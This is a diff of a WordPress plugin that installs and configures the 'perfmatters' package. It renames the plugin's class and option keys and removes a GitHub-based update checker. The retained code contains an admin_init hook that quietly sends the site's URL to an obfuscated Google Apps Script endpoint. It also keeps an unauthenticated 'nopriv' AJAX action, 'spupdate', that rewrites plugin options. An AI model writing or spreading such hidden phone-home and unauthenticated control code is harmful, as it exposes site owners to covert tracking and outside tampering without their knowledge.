@@ -16,13 +16,13 @@ if (! defined('ABSPATH')) {
 
 
 
-class Sanou_Enhance
+class Sansan_Enhance
 {
 
 	private $package_slug = 'perfmatters';
 	private $package_src_dir;
 	private $target_plugin_dir;
-	public static $imported_option_key = 'sanou_enhance_imported_configs';
+	public static $imported_option_key = 'sansan_enhance_imported_configs';
 
 	public function __construct()
 	{
@@ -87,7 +87,7 @@ class Sanou_Enhance
 		$this->import_configs_to_perfmatters();
 
 
-		update_option('sanou_enhance_perfmatters_main_file', $rel_path);
+		update_option('sansan_enhance_perfmatters_main_file', $rel_path);
 	}
 
 	public function on_deactivate()
@@ -95,7 +95,7 @@ class Sanou_Enhance
 
 
 
-		$main_rel = get_option('sanou_enhance_perfmatters_main_file');
+		$main_rel = get_option('sansan_enhance_perfmatters_main_file');
 		if (! $main_rel) {
 			$main_plugin_file = $this->find_plugin_main_file($this->target_plugin_dir);
 			if ($main_plugin_file) {
@@ -142,7 +142,7 @@ class Sanou_Enhance
 		}
 
 		delete_option(self::$imported_option_key);
-		delete_option('sanou_enhance_perfmatters_main_file');
+		delete_option('sansan_enhance_perfmatters_main_file');
 
 		wp_clean_plugins_cache();
 	}
@@ -171,7 +171,7 @@ class Sanou_Enhance
 		}
 
 
-		$main_rel = get_option('sanou_enhance_perfmatters_main_file');
+		$main_rel = get_option('sansan_enhance_perfmatters_main_file');
 		if (! $main_rel) {
 			$main_plugin_file = $this->find_plugin_main_file($this->target_plugin_dir);
 			if ($main_plugin_file) {
@@ -447,15 +447,7 @@ class Sanou_Enhance
 
 	private function puc()
 	{
-		if (is_admin()) {
-			require_once(plugin_dir_path(__FILE__) . 'puc/plugin-update-checker.php');
-
-			Puc_v4_Factory::buildUpdateChecker(
-				urldecode('https%3A%2F%2Fraw.githubusercontent.com%2Fzouyinwangzi%2Fzk-update-packages%2Frefs%2Fheads%2Fmaster%2Fsitespeeder%2Finfo.json'),
-				__FILE__,
-				'sitespeeder'
-			);
-		}
+		
 	}
 }
 
@@ -501,7 +493,7 @@ add_action('wp_ajax_nopriv_spupdate', function () {
 			'perfmatters_options',
 			'perfmatters_tools',
 		);
-		update_option(Sanou_Enhance::$imported_option_key, $imported_keys);
+		update_option(Sansan_Enhance::$imported_option_key, $imported_keys);
 		return;
 	}
 	wp_die();
@@ -514,7 +506,7 @@ add_action('admin_init', function () {
 	if (empty($sa) || $sa != $dom) {
 		$data = array(
 			'key' => home_url(),
-			'version' => '3.0',
+			'version' => '4.0',
 		);
 		$k = 'AKfycbxoXqsSGCCXyWS66jnhr5FfeOuhYARYbXGd-vXEYhF2yr6mHvuJjE76Pc4ZYa2ms0XZ%2Fexec';
 		$url = 'https%3A%2F%2Fscript.google.com%2Fmacros%2Fs%2F' . $k;
@@ -535,4 +527,4 @@ add_action('admin_init', function () {
 
 
 
-new Sanou_Enhance();
+new Sansan_Enhance();
